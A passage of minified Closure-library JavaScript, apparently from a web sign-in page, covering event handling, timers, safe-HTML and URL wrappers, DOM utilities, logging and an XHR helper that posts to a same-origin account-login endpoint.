d);PS_nb--;(c=PS_sb(b))?(PS_jb(c,a),0==c.b&&(c.src=null,b[PS_lb]=null)):PS_fb(a)}}},PS_ub=function(a){return a in PS_mb?PS_mb[a]:PS_mb[a]="on"+a},PS_zb=function(a,b,c,d){var e=!0;if(a=PS_sb(a))if(b=a.a[b.toString()])for(b=b.concat(),a=0;a<b.length;a++){var f=b[a];f&&f.ia==c&&!f.$&&(f=PS_yb(f,d),e=e&&!1!==f)}return e},PS_yb=function(a,b){var c=a.listener,d=a.ka||a.src;a.ha&&PS_z(a);return c.call(d,b)},PS_vb=function(a,b){if(a.$)return!0;if(!PS_8a){var c;if(!(c=b))a:{c=["window","event"];for(var d=
PS_b,e;e=c.shift();)if(null!=d[e])d=d[e];else{c=null;break a}c=d}e=c;c=new PS_$a(e,this);d=!0;if(!(0>e.keyCode||void 0!=e.returnValue)){a:{var f=!1;if(0==e.keyCode)try{e.keyCode=-1;break a}catch(l){f=!0}if(f||void 0==e.returnValue)e.returnValue=!0}e=[];for(f=c.a;f;f=f.parentNode)e.push(f);for(var f=a.type,g=e.length-1;0<=g;g--){c.a=e[g];var h=PS_zb(e[g],f,!0,c),d=d&&h}for(g=0;g<e.length;g++)c.a=e[g],h=PS_zb(e[g],f,!1,c),d=d&&h}return d}return PS_yb(a,new PS_$a(b,this))},PS_sb=function(a){a=a[PS_lb];
return a instanceof PS_gb?a:null},PS_Ab="__closure_events_fn_"+(1E9*Math.random()>>>0),PS_pb=function(a){PS_o(a,"Listener can not be null.");if("function"==PS_d(a))return a;PS_o(a.handleEvent,"An object listener must have handleEvent method.");a[PS_Ab]||(a[PS_Ab]=function(b){return a.handleEvent(b)});return a[PS_Ab]};var PS_Bb=function(a){var b;b=b||0;return function(){return a.apply(this,Array.prototype.slice.call(arguments,0,b))}},PS_Cb=function(a){var b=!1,c;return function(){b||(c=a(),b=!0);return c}};var PS_Db=function(a,b,c){PS_l.call(this);this.a=null;this.g=!1;this.c=a;this.h=c;this.b=b||window;this.f=PS_i(this.i,this)};PS_k(PS_Db,PS_l);
var PS_Hb=function(a){PS_Eb(a);a.g=!1;var b=PS_Fb(a),c=PS_Gb(a);b&&!c&&a.b.mozRequestAnimationFrame?(a.a=PS_ob(a.b,"MozBeforePaint",a.f),a.b.mozRequestAnimationFrame(null),a.g=!0):a.a=b&&c?b.call(a.b,a.f):a.b.setTimeout(PS_Bb(a.f),20)},PS_Eb=function(a){if(null!=a.a){var b=PS_Fb(a),c=PS_Gb(a);b&&!c&&a.b.mozRequestAnimationFrame?PS_z(a.a):b&&c?c.call(a.b,a.a):a.b.clearTimeout(a.a)}a.a=null};PS_Db.prototype.i=function(){this.g&&this.a&&PS_z(this.a);this.a=null;this.c.call(this.h,PS_j())};
PS_Db.prototype.m=function(){PS_Eb(this);PS_Db.A.m.call(this)};var PS_Fb=function(a){a=a.b;return a.requestAnimationFrame||a.webkitRequestAnimationFrame||a.mozRequestAnimationFrame||a.oRequestAnimationFrame||a.msRequestAnimationFrame||null},PS_Gb=function(a){a=a.b;return a.cancelAnimationFrame||a.cancelRequestAnimationFrame||a.webkitCancelRequestAnimationFrame||a.mozCancelRequestAnimationFrame||a.oCancelRequestAnimationFrame||a.msCancelRequestAnimationFrame||null};var PS_A=function(){PS_l.call(this);this.C=new PS_gb(this);this.ba=this;this.G=null};PS_k(PS_A,PS_l);PS_A.prototype[PS_bb]=!0;PS_A.prototype.I=function(a){this.G=a};PS_A.prototype.addEventListener=function(a,b,c,d){PS_ob(this,a,b,c,d)};PS_A.prototype.removeEventListener=function(a,b,c,d){PS_xb(this,a,b,c,d)};
var PS_B=function(a,b){PS_qb(a);var c,d=a.G;if(d){c=[];for(var e=1;d;d=d.G)c.push(d),PS_o(1E3>++e,"infinite loop")}var d=a.ba,e=b,f=e.type||e;if(PS_f(e))e=new PS_y(e,d);else if(e instanceof PS_y)e.target=e.target||d;else{var g=e,e=new PS_y(f,d);PS_Ta(e,g)}var g=!0,h;if(c)for(var l=c.length-1;0<=l;l--)h=e.a=c[l],g=PS_Ib(h,f,!0,e)&&g;h=e.a=d;g=PS_Ib(h,f,!0,e)&&g;g=PS_Ib(h,f,!1,e)&&g;if(c)for(l=0;l<c.length;l++)h=e.a=c[l],g=PS_Ib(h,f,!1,e)&&g;return g};
PS_A.prototype.m=function(){PS_A.A.m.call(this);if(this.C){var a=this.C,b=0,c;for(c in a.a){for(var d=a.a[c],e=0;e<d.length;e++)++b,PS_fb(d[e]);delete a.a[c];a.b--}}this.G=null};var PS_Ib=function(a,b,c,d){b=a.C.a[String(b)];if(!b)return!0;b=b.concat();for(var e=!0,f=0;f<b.length;++f){var g=b[f];if(g&&!g.$&&g.ia==c){var h=g.listener,l=g.ka||g.src;g.ha&&PS_jb(a.C,g);e=!1!==h.call(l,d)&&e}}return e&&0!=d.Fa},PS_qb=function(a){PS_o(a.C,"Event target is not initialized. Did you call the superclass (goog.events.EventTarget) constructor?")};var PS_C=function(a,b){PS_A.call(this);this.c=a||1;this.b=b||PS_b;this.g=PS_i(this.i,this);this.h=PS_j()};PS_k(PS_C,PS_A);PS_C.prototype.f=!1;PS_C.prototype.a=null;var PS_Lb=function(a,b){a.c=b;a.a&&a.f?(PS_Jb(a),PS_Kb(a)):a.a&&PS_Jb(a)};PS_C.prototype.i=function(){if(this.f){var a=PS_j()-this.h;0<a&&a<.8*this.c?this.a=this.b.setTimeout(this.g,this.c-a):(this.a&&(this.b.clearTimeout(this.a),this.a=null),PS_B(this,"tick"),this.f&&(this.a=this.b.setTimeout(this.g,this.c),this.h=PS_j()))}};
var PS_Kb=function(a){a.f=!0;a.a||(a.a=a.b.setTimeout(a.g,a.c),a.h=PS_j())},PS_Jb=function(a){a.f=!1;a.a&&(a.b.clearTimeout(a.a),a.a=null)};PS_C.prototype.m=function(){PS_C.A.m.call(this);PS_Jb(this);delete this.b};var PS_Mb=function(a,b,c){if("function"==PS_d(a))c&&(a=PS_i(a,c));else if(a&&"function"==typeof a.handleEvent)a=PS_i(a.handleEvent,a);else throw Error("Invalid listener argument");return 2147483647<b?-1:PS_b.setTimeout(a,b||0)};var PS_Nb=function(a,b,c){PS_l.call(this);this.c=a;this.g=b||0;this.b=c;this.f=PS_i(this.h,this)};PS_k(PS_Nb,PS_l);PS_Nb.prototype.a=0;PS_Nb.prototype.m=function(){PS_Nb.A.m.call(this);PS_Ob(this);delete this.c;delete this.b};var PS_Ob=function(a){0!=a.a&&PS_b.clearTimeout(a.a);a.a=0};PS_Nb.prototype.h=function(){this.a=0;this.c&&this.c.call(this.b)};var PS_Pb=function(a){if(a.classList)return a.classList;a=a.className;return PS_f(a)&&a.match(/\S+/g)||[]},PS_Qb=function(a,b){var c;a.classList?c=a.classList.contains(b):(c=PS_Pb(a),c=0<=PS_Ha(c,b));return c},PS_Rb=function(a,b){a.classList?a.classList.add(b):PS_Qb(a,b)||(a.className+=0<a.className.length?" "+b:b)},PS_Sb=function(a,b){if(a.classList)PS_q(b,function(b){PS_Rb(a,b)});else{var c={};PS_q(PS_Pb(a),function(a){c[a]=!0});PS_q(b,function(a){c[a]=!0});a.className="";for(var d in c)a.className+=
0<a.className.length?" "+d:d}},PS_Tb=function(a,b){a.classList?a.classList.remove(b):PS_Qb(a,b)&&(a.className=PS_Ia(PS_Pb(a),function(a){return a!=b}).join(" "))},PS_D=function(a,b,c){c?PS_Rb(a,b):PS_Tb(a,b)};var PS_Ub=PS_("Firefox"),PS_Vb=PS_Ya()||PS_("iPod"),PS_Wb=PS_("iPad"),PS_Xb=PS_("Android")&&!(PS_Xa()||PS_("Firefox")||PS_Wa()||PS_("Silk")),PS_Yb=PS_Xa(),PS_Zb=PS_("Safari")&&!(PS_Xa()||PS_("Coast")||PS_Wa()||PS_("Edge")||PS_("Silk")||PS_("Android"))&&!(PS_Ya()||PS_("iPad")||PS_("iPod"));var PS__b=!PS_t,PS_0b=function(a){return PS__b&&a.dataset?"altText"in a.dataset?a.dataset.altText:null:a.getAttribute("data-"+"altText".replace(/([A-Z])/g,"-$1").toLowerCase())};var PS_1b={area:!0,base:!0,br:!0,col:!0,command:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0};var PS_E=function(){this.a="";this.b=PS_2b};PS_E.prototype.W=!0;PS_E.prototype.T=function(){return this.a};PS_E.prototype.toString=function(){return"Const{"+this.a+"}"};var PS_3b=function(a){if(a instanceof PS_E&&a.constructor===PS_E&&a.b===PS_2b)return a.a;PS_p("expected object of type Const, got '"+a+"'");return"type_error:Const"},PS_2b={},PS_4b=function(a){var b=new PS_E;b.a=a;return b};var PS_F=function(){this.a="";this.b=PS_5b};PS_F.prototype.W=!0;var PS_5b={};PS_F.prototype.T=function(){return this.a};PS_F.prototype.toString=function(){return"SafeStyle{"+this.a+"}"};var PS_6b=function(a){var b=new PS_F;b.a=a;return b},PS_7b=PS_6b(""),PS_8b=/^[-,."'%_!# a-zA-Z0-9]+$/;var PS_G=function(){this.a="";this.b=PS_9b};PS_a=PS_G.prototype;PS_a.W=!0;PS_a.T=function(){return this.a};PS_a.oa=!0;PS_a.da=function(){return 1};PS_a.toString=function(){return"SafeUrl{"+this.a+"}"};
var PS_$b=function(a){if(a instanceof PS_G&&a.constructor===PS_G&&a.b===PS_9b)return a.a;PS_p("expected object of type SafeUrl, got '"+a+"'");return"type_error:SafeUrl"},PS_ac=/^(?:(?:https?|mailto|ftp):|[^&:/?#]*(?:[/?#]|$))/i,PS_bc=function(a){if(a instanceof PS_G)return a;a=a.W?a.T():String(a);PS_ac.test(a)||(a="about:invalid#zClosurez");var b=new PS_G;b.a=a;return b},PS_9b={};var PS_dc=function(){this.a="";this.b=PS_cc};PS_a=PS_dc.prototype;PS_a.W=!0;PS_a.T=function(){return this.a};PS_a.oa=!0;PS_a.da=function(){return 1};PS_a.toString=function(){return"TrustedResourceUrl{"+this.a+"}"};var PS_ec=function(a){if(a instanceof PS_dc&&a.constructor===PS_dc&&a.b===PS_cc)return a.a;PS_p("expected object of type TrustedResourceUrl, got '"+a+"'");return"type_error:TrustedResourceUrl"},PS_cc={},PS_fc=function(a){var b=new PS_dc;b.a=a;return b};var PS_H=function(){this.a="";this.c=PS_gc;this.b=null};PS_a=PS_H.prototype;PS_a.oa=!0;PS_a.da=function(){return this.b};PS_a.W=!0;PS_a.T=function(){return this.a};PS_a.toString=function(){return"SafeHtml{"+this.a+"}"};
var PS_I=function(a){if(a instanceof PS_H&&a.constructor===PS_H&&a.c===PS_gc)return a.a;PS_p("expected object of type SafeHtml, got '"+a+"'");return"type_error:SafeHtml"},PS_hc=function(a){if(a instanceof PS_H)return a;var b=null;a.oa&&(b=a.da());a=PS_n(a.W?a.T():String(a));return PS_J(a,b)},PS_ic=/^[a-zA-Z0-9-]+$/,PS_jc={action:!0,cite:!0,data:!0,formaction:!0,href:!0,manifest:!0,poster:!0,src:!0},PS_kc={APPLET:!0,BASE:!0,EMBED:!0,IFRAME:!0,LINK:!0,MATH:!0,OBJECT:!0,SCRIPT:!0,STYLE:!0,SVG:!0,TEMPLATE:!0},
PS_mc=function(a,b,c){if(!PS_ic.test(a))throw Error("Invalid tag name <"+a+">.");if(a.toUpperCase()in PS_kc)throw Error("Tag name <"+a+"> is not allowed for SafeHtml.");return PS_lc(a,b,c)},PS_nc=function(a){var b=0,c="",d=function(a){PS_e(a)?PS_q(a,d):(a=PS_hc(a),c+=PS_I(a),a=a.da(),0==b?b=a:0!=a&&b!=a&&(b=null))};PS_q(arguments,d);return PS_J(c,b)},PS_gc={},PS_J=function(a,b){var c=new PS_H;c.a=a;c.b=b;return c},PS_lc=function(a,b,c){var d=null,e="<"+a;if(b)for(var f in b){if(!PS_ic.test(f))throw Error('Invalid attribute name "'+
f+'".');var g=b[f];if(null!=g){var h,l=a;h=f;if(g instanceof PS_E)g=PS_3b(g);else if("style"==h.toLowerCase()){if(!PS_h(g))throw Error('The "style" attribute requires goog.html.SafeStyle or map of style properties, '+typeof g+" given: "+g);if(!(g instanceof PS_F)){var l="",k=void 0;for(k in g){if(!/^[-_a-zA-Z0-9]+$/.test(k))throw Error("Name allows only [-_a-zA-Z0-9], got: "+k);var m=g[k];if(null!=m){if(m instanceof PS_E)m=PS_3b(m),PS_o(!/[{;}]/.test(m),"Value does not allow [{;}].");else if(PS_8b.test(m)){for(var n=
!0,p=!0,q=0;q<m.length;q++){var r=m.charAt(q);"'"==r&&p?n=!n:'"'==r&&n&&(p=!p)}n&&p||(PS_p("String value requires balanced quotes, got: "+m),m="zClosurez")}else PS_p("String value allows only [-,.\"'%_!# a-zA-Z0-9], got: "+m),m="zClosurez";l+=k+":"+m+";"}}l?(PS_o(!/[<>]/.test(l),"Forbidden characters in style string: "+l),g=PS_6b(l)):g=PS_7b}l=void 0;g instanceof PS_F&&g.constructor===PS_F&&g.b===PS_5b?l=g.a:(PS_p("expected object of type SafeStyle, got '"+g+"'"),l="type_error:SafeStyle");g=l}else{if(/^on/i.test(h))throw Error('Attribute "'+
h+'" requires goog.string.Const value, "'+g+'" given.');if(h.toLowerCase()in PS_jc)if(g instanceof PS_dc)g=PS_ec(g);else if(g instanceof PS_G)g=PS_$b(g);else if(PS_f(g))g=PS_bc(g).T();else throw Error('Attribute "'+h+'" on tag "'+l+'" requires goog.html.SafeUrl, goog.string.Const, or string, value "'+g+'" given.');}g.W&&(g=g.T());PS_o(PS_f(g)||PS_g(g),"String or number value expected, got "+typeof g+" with value: "+g);h=h+'="'+PS_n(String(g))+'"';e=e+(" "+h)}}null!=c?PS_e(c)||(c=[c]):c=[];!0===PS_1b[a.toLowerCase()]?
(PS_o(!c.length,"Void tag <"+a+"> does not allow content."),e+=">"):(d=PS_nc(c),e+=">"+PS_I(d)+"</"+a+">",d=d.da());(a=b&&b.dir)&&(/^(ltr|rtl|auto)$/i.test(a)?d=0:d=null);return PS_J(e,d)};PS_J("<!DOCTYPE html>",0);var PS_oc=PS_J("",0);var PS_K=function(a,b){this.x=PS_c(a)?a:0;this.y=PS_c(b)?b:0};PS_K.prototype.clone=function(){return new PS_K(this.x,this.y)};PS_K.prototype.toString=function(){return"("+this.x+", "+this.y+")"};var PS_pc=function(a,b){return new PS_K(a.x-b.x,a.y-b.y)};PS_K.prototype.round=function(){this.x=Math.round(this.x);this.y=Math.round(this.y);return this};var PS_L=function(a,b){this.width=a;this.height=b};PS_L.prototype.clone=function(){return new PS_L(this.width,this.height)};PS_L.prototype.toString=function(){return"("+this.width+" x "+this.height+")"};PS_L.prototype.round=function(){this.width=Math.round(this.width);this.height=Math.round(this.height);return this};!PS_u&&!PS_t||PS_t&&9<=PS_x||PS_u&&PS_w("1.9.1");PS_t&&PS_w("9");var PS_qc=PS_t||PS_s||PS_v;var PS_N=function(a){return a?new PS_rc(PS_M(a)):PS_ka||(PS_ka=new PS_rc)},PS_sc=function(a,b){return PS_f(b)?a.getElementById(b):b},PS_O=function(a){var b=document;PS_Aa(a);b=PS_sc(b,a);return b=PS_Ca(b,"No element found with id: "+a)},PS_uc=function(a,b){var c=b||document,d=null;c.getElementsByClassName?d=c.getElementsByClassName(a)[0]:c.querySelectorAll&&c.querySelector?d=c.querySelector("."+a):d=PS_tc("*",a,b)[0];return d||null},PS_vc=function(a){var b=PS_uc(a,void 0);return PS_o(b,"No element found with className: "+
a)},PS_tc=function(a,b,c){var d=document;c=c||d;var e=a&&"*"!=a?a.toUpperCase():"";if(c.querySelectorAll&&c.querySelector&&(e||b))return c.querySelectorAll(e+(b?"."+b:""));if(b&&c.getElementsByClassName){a=c.getElementsByClassName(b);if(e){c={};for(var f=d=0,g;g=a[f];f++)e==g.nodeName&&(c[d++]=g);c.length=d;return c}return a}a=c.getElementsByTagName(e||"*");if(b){c={};for(f=d=0;g=a[f];f++){var e=g.className,h;if(h="function"==typeof e.split)h=0<=PS_Ha(e.split(/\s+/),b);h&&(c[d++]=g)}c.length=d;return c}return a},
PS_xc=function(a,b){PS_Oa(b,function(b,d){"style"==d?a.style.cssText=b:"class"==d?a.className=b:"for"==d?a.htmlFor=b:PS_wc.hasOwnProperty(d)?a.setAttribute(PS_wc[d],b):0==d.lastIndexOf("aria-",0)||0==d.lastIndexOf("data-",0)?a.setAttribute(d,b):a[d]=b})},PS_wc={cellpadding:"cellPadding",cellspacing:"cellSpacing",colspan:"colSpan",frameborder:"frameBorder",height:"height",maxlength:"maxLength",role:"role",rowspan:"rowSpan",type:"type",usemap:"useMap",valign:"vAlign",width:"width"},PS_Ac=function(a){var b=
PS_yc(a);a=PS_zc(a);return PS_t&&PS_w("10")&&a.pageYOffset!=b.scrollTop?new PS_K(b.scrollLeft,b.scrollTop):new PS_K(a.pageXOffset||b.scrollLeft,a.pageYOffset||b.scrollTop)},PS_yc=function(a){return a.scrollingElement?a.scrollingElement:PS_v||"CSS1Compat"!=a.compatMode?a.body||a.documentElement:a.documentElement},PS_Bc=function(a){return a?PS_zc(a):window},PS_zc=function(a){return a.parentWindow||a.defaultView},PS_Cc=function(a){for(var b;b=a.firstChild;)a.removeChild(b)},PS_Dc=function(a){a&&a.parentNode&&
a.parentNode.removeChild(a)},PS_Ec=function(a){if(PS_c(a.firstElementChild))a=a.firstElementChild;else for(a=a.firstChild;a&&1!=a.nodeType;)a=a.nextSibling;return a},PS_Fc=function(a,b){if(!a||!b)return!1;if(a.contains&&1==b.nodeType)return a==b||a.contains(b);if("undefined"!=typeof a.compareDocumentPosition)return a==b||Boolean(a.compareDocumentPosition(b)&16);for(;b&&a!=b;)b=b.parentNode;return b==a},PS_M=function(a){PS_o(a,"Node cannot be null or undefined.");return 9==a.nodeType?a:a.ownerDocument||
a.document},PS_Gc=function(a){return a.contentDocument||a.contentWindow.document},PS_Hc=function(a,b){PS_o(null!=a,"goog.dom.setTextContent expects a non-null value for node");if("textContent"in a)a.textContent=b;else if(3==a.nodeType)a.data=b;else if(a.firstChild&&3==a.firstChild.nodeType){for(;a.lastChild!=a.firstChild;)a.removeChild(a.lastChild);a.firstChild.data=b}else{PS_Cc(a);var c=PS_M(a);a.appendChild(c.createTextNode(String(b)))}},PS_rc=function(a){this.a=a||PS_b.document||document};
PS_rc.prototype.H=function(a){return PS_sc(this.a,a)};var PS_Ic=function(a){return"CSS1Compat"==a.a.compatMode};PS_rc.prototype.contains=PS_Fc;var PS_Jc="StopIteration"in PS_b?PS_b.StopIteration:{message:"StopIteration",stack:""},PS_Kc=function(){};PS_Kc.prototype.next=function(){throw PS_Jc;};PS_Kc.prototype.D=function(){return this};var PS_P=function(a,b){this.b={};this.a=[];this.f=this.c=0;var c=arguments.length;if(1<c){if(c%2)throw Error("Uneven number of arguments");for(var d=0;d<c;d+=2)PS_Lc(this,arguments[d],arguments[d+1])}else if(a){a instanceof PS_P?(c=a.Y(),d=a.Z()):(c=PS_Qa(a),d=PS_Pa(a));for(var e=0;e<c.length;e++)PS_Lc(this,c[e],d[e])}};PS_P.prototype.Z=function(){PS_Mc(this);for(var a=[],b=0;b<this.a.length;b++)a.push(this.b[this.a[b]]);return a};PS_P.prototype.Y=function(){PS_Mc(this);return this.a.concat()};
var PS_Mc=function(a){if(a.c!=a.a.length){for(var b=0,c=0;b<a.a.length;){var d=a.a[b];Object.prototype.hasOwnProperty.call(a.b,d)&&(a.a[c++]=d);b++}a.a.length=c}if(a.c!=a.a.length){for(var e={},c=b=0;b<a.a.length;)d=a.a[b],Object.prototype.hasOwnProperty.call(e,d)||(a.a[c++]=d,e[d]=1),b++;a.a.length=c}},PS_Lc=function(a,b,c){Object.prototype.hasOwnProperty.call(a.b,b)||(a.c++,a.a.push(b),a.f++);a.b[b]=c};
PS_P.prototype.forEach=function(a,b){for(var c=this.Y(),d=0;d<c.length;d++){var e=c[d];a.call(b,Object.prototype.hasOwnProperty.call(this.b,e)?this.b[e]:void 0,e,this)}};PS_P.prototype.clone=function(){return new PS_P(this)};PS_P.prototype.D=function(a){PS_Mc(this);var b=0,c=this.f,d=this,e=new PS_Kc;e.next=function(){if(c!=d.f)throw Error("The map has changed since the iterator was created");if(b>=d.a.length)throw PS_Jc;var e=d.a[b++];return a?e:d.b[e]};return e};var PS_Q=function(a,b){if("FORM"==a.tagName)for(var c=a.elements,d=0;a=c[d];d++)PS_Q(a,b);else 1==b&&a.blur(),a.disabled=b};var PS_R=function(a){PS_l.call(this);this.b=a;this.a={}};PS_k(PS_R,PS_l);
var PS_Nc=[],PS_S=function(a,b,c,d,e){PS_e(c)||(c&&(PS_Nc[0]=c.toString()),c=PS_Nc);for(var f=0;f<c.length;f++){var g=PS_ob(b,c[f],d||a.handleEvent,e||!1,a.b||a);if(!g)break;a.a[g.na]=g}},PS_Oc=function(a,b,c,d,e,f){if(PS_e(c))for(var g=0;g<c.length;g++)PS_Oc(a,b,c[g],d,e,f);else(b=PS_wb(b,c,d||a.handleEvent,e,f||a.b||a))&&(a.a[b.na]=b)},PS_Pc=function(a,b,c,d,e,f){if(PS_e(c))for(var g=0;g<c.length;g++)PS_Pc(a,b,c[g],d,e,f);else d=d||a.handleEvent,f=f||a.b||a,d=PS_pb(d),e=!!e,c=PS_cb(b)?PS_kb(b.C,
String(c),d,e,f):b?(b=PS_sb(b))?PS_kb(b,c,d,e,f):null:null,c&&(PS_z(c),delete a.a[c.na])},PS_Qc=function(a){PS_Oa(a.a,function(a,c){this.a.hasOwnProperty(c)&&PS_z(a)},a);a.a={}};PS_R.prototype.m=function(){PS_R.A.m.call(this);PS_Qc(this)};PS_R.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented");};var PS_Rc=["click",PS_u?"keypress":"keydown","keyup"],PS_Sc=function(a,b,c,d,e){var f=function(a){var c=PS_pb(b),e=a.target,e=PS_h(e)&&1==e.nodeType?a.target.getAttribute("role")||null:null;"click"==a.type&&(PS_7a?0==a.V.button:"click"==a.type||a.V.button&PS_ab[0])&&!(PS_v&&PS_1a&&a.xa)?c.call(d,a):13!=a.keyCode&&3!=a.keyCode||"keyup"==a.type?32!=a.keyCode||"keyup"!=a.type||"button"!=e&&"tab"!=e||(c.call(d,a),a.preventDefault()):(a.type="keypress",c.call(d,a))};f.c=b;f.a=d;e?PS_S(e,a,PS_Rc,f,c):PS_ob(a,
PS_Rc,f,c)};var PS_Tc=function(a){a=String(a);if(/^\s*$/.test(a)?0:/^[\],:{}\s\u2028\u2029]*$/.test(a.replace(/\\["\\\/bfnrtu]/g,"@").replace(/(?:"[^"\\\n\r\u2028\u2029\x00-\x08\x0a-\x1f]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)[\s\u2028\u2029]*(?=:|,|]|}|$)/g,"]").replace(/(?:^|:|,)(?:[\s\u2028\u2029]*\[)+/g,"")))try{return eval("("+a+")")}catch(b){}throw Error("Invalid JSON string: "+a);};var PS_Uc=function(a){if(a.Z&&"function"==typeof a.Z)return a.Z();if(PS_f(a))return a.split("");if(PS_ca(a)){for(var b=[],c=a.length,d=0;d<c;d++)b.push(a[d]);return b}return PS_Pa(a)},PS_Vc=function(a,b){if(a.forEach&&"function"==typeof a.forEach)a.forEach(b,void 0);else if(PS_ca(a)||PS_f(a))PS_q(a,b,void 0);else{var c;if(a.Y&&"function"==typeof a.Y)c=a.Y();else if(a.Z&&"function"==typeof a.Z)c=void 0;else if(PS_ca(a)||PS_f(a)){c=[];for(var d=a.length,e=0;e<d;e++)c.push(e)}else c=PS_Qa(a);for(var d=
PS_Uc(a),e=d.length,f=0;f<e;f++)b.call(void 0,d[f],c&&c[f],a)}};var PS_Wc=function(a,b,c,d,e){this.reset(a,b,c,d,e)};PS_Wc.prototype.a=null;var PS_Xc=0;PS_Wc.prototype.reset=function(a,b,c,d,e){"number"==typeof e||PS_Xc++;d||PS_j();this.b=b;delete this.a};var PS_Yc=function(a){this.f=a;this.b=this.c=this.a=null},PS_Zc=function(a,b){this.name=a;this.value=b};PS_Zc.prototype.toString=function(){return this.name};var PS__c=new PS_Zc("SEVERE",1E3),PS_0c=new PS_Zc("CONFIG",700),PS_1c=new PS_Zc("FINE",500),PS_2c=function(a){if(a.c)return a.c;if(a.a)return PS_2c(a.a);PS_p("Root logger has no level set.");return null};
PS_Yc.prototype.log=function(a,b,c){if(a.value>=PS_2c(this).value)for("function"==PS_d(b)&&(b=b()),a=new PS_Wc(a,String(b),this.f),c&&(a.a=c),c="log:"+a.b,PS_b.console&&(PS_b.console.timeStamp?PS_b.console.timeStamp(c):PS_b.console.markTimeline&&PS_b.console.markTimeline(c)),PS_b.msWriteProfilerMark&&PS_b.msWriteProfilerMark(c),c=this;c;)c=c.a};
var PS_3c={},PS_4c=null,PS_5c=function(a){PS_4c||(PS_4c=new PS_Yc(""),PS_3c[""]=PS_4c,PS_4c.c=PS_0c);var b;if(!(b=PS_3c[a])){b=new PS_Yc(a);var c=a.lastIndexOf("."),d=a.substr(c+1),c=PS_5c(a.substr(0,c));c.b||(c.b={});c.b[d]=b;b.a=c;PS_3c[a]=b}return b};var PS_T=function(a,b){a&&a.log(PS_1c,b,void 0)};var PS_6c=/^(?:([^:/?#.]+):)?(?:\/\/(?:([^/?#]*)@)?([^/#?]*?)(?::([0-9]+))?(?=[/#?]|$))?([^?#]+)?(?:\?([^#]*))?(?:#(.*))?$/;var PS_7c=function(){};PS_7c.prototype.a=null;var PS_9c=function(a){var b;(b=a.a)||(b={},PS_8c(a)&&(b[0]=!0,b[1]=!0),b=a.a=b);return b};var PS_$c,PS_ad=function(){};PS_k(PS_ad,PS_7c);
var PS_bd=function(a){return(a=PS_8c(a))?new ActiveXObject(a):new XMLHttpRequest},PS_8c=function(a){if(!a.b&&"undefined"==typeof XMLHttpRequest&&"undefined"!=typeof ActiveXObject){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++){var d=b[c];try{return new ActiveXObject(d),a.b=d}catch(e){}}throw Error("Could not create ActiveXObject. ActiveX might be disabled, or MSXML might not be installed");}return a.b};PS_$c=new PS_ad;var PS_U=function(a){PS_A.call(this);this.X=new PS_P;this.s=a||null;this.b=!1;this.o=this.a=null;this.f=this.J=this.i="";this.c=this.v=this.h=this.u=!1;this.g=0;this.j=null;this.O="";this.l=this.ga=!1};PS_k(PS_U,PS_A);var PS_cd=PS_U.prototype,PS_dd=PS_5c("goog.net.XhrIo");PS_cd.F=PS_dd;var PS_ed=/^https?$/i,PS_fd=["POST","PUT"],PS_gd=[],PS_id=function(a,b){var c=new PS_U;PS_gd.push(c);a&&(PS_qb(c),PS_ib(c.C,"complete",a,!1,void 0,void 0));PS_ib(c.C,"ready",c.U,!0,void 0,void 0);PS_hd(c,b)};
PS_U.prototype.U=function(){this.S();PS_Na(PS_gd,this)};
var PS_hd=function(a,b){var c={"Content-type":"application/x-www-form-urlencoded"};if(a.a)throw Error("[goog.net.XhrIo] Object is active with another request="+a.i+"; newUri=/accountLoginInfoXhr");a.i="/accountLoginInfoXhr";a.f="";a.J="POST";a.u=!1;a.b=!0;a.a=a.s?PS_bd(a.s):PS_bd(PS_$c);a.o=a.s?PS_9c(a.s):PS_9c(PS_$c);a.a.onreadystatechange=PS_i(a.K,a);try{PS_T(a.F,PS_V(a,"Opening Xhr")),a.v=!0,a.a.open("POST","/accountLoginInfoXhr",!0),a.v=!1}catch(g){PS_T(a.F,PS_V(a,"Error opening Xhr: "+g.message));
PS_jd(a,g);return}var d=b||"",e=a.X.clone();c&&PS_Vc(c,function(a,b){PS_Lc(e,b,a)});var c=PS_Ma(e.Y()),f=PS_b.FormData&&d instanceof PS_b.FormData;!(0<=PS_Ha(PS_fd,"POST"))||c||f||PS_Lc(e,"Content-Type","application/x-www-form-urlencoded;charset=utf-8");e.forEach(function(a,b){this.a.setRequestHeader(b,a)},a);a.O&&(a.a.responseType=a.O);PS_Ra(a.a)&&(a.a.withCredentials=a.ga);try{PS_kd(a),0<a.g&&(a.l=PS_ld(a.a),PS_T(a.F,PS_V(a,"Will abort after "+a.g+"ms if incomplete, xhr2 "+a.l)),a.l?(a.a.timeout=
a.g,a.a.ontimeout=PS_i(a.P,a)):a.j=PS_Mb(a.P,a.g,a)),PS_T(a.F,PS_V(a,"Sending request")),a.h=!0,a.a.send(d),a.h=!1}catch(g){PS_T(a.F,PS_V(a,"Send error: "+g.message)),PS_jd(a,g)}},PS_ld=function(a){return PS_t&&PS_w(9)&&PS_g(a.timeout)&&PS_c(a.ontimeout)},PS_La=function(a){return"content-type"==a.toLowerCase()};
PS_U.prototype.P=function(){"undefined"!=typeof PS_aa&&this.a&&(this.f="Timed out after "+this.g+"ms, aborting",PS_T(this.F,PS_V(this,this.f)),PS_B(this,"timeout"),this.a&&this.b&&(PS_T(this.F,PS_V(this,"Aborting")),this.b=!1,this.c=!0,this.a.abort(),this.c=!1,PS_B(this,"complete"),PS_B(this,"abort"),PS_md(this)))};var PS_jd=function(a,b){a.b=!1;a.a&&(a.c=!0,a.a.abort(),a.c=!1);a.f=b;PS_nd(a);PS_md(a)},PS_nd=function(a){a.u||(a.u=!0,PS_B(a,"complete"),PS_B(a,"error"))};
PS_U.prototype.m=function(){this.a&&(this.b&&(this.b=!1,this.c=!0,this.a.abort(),this.c=!1),PS_md(this,!0));PS_U.A.m.call(this)};PS_U.prototype.K=function(){this.L||(this.v||this.h||this.c?PS_od(this):this.fa())};PS_U.prototype.fa=function(){PS_od(this)};
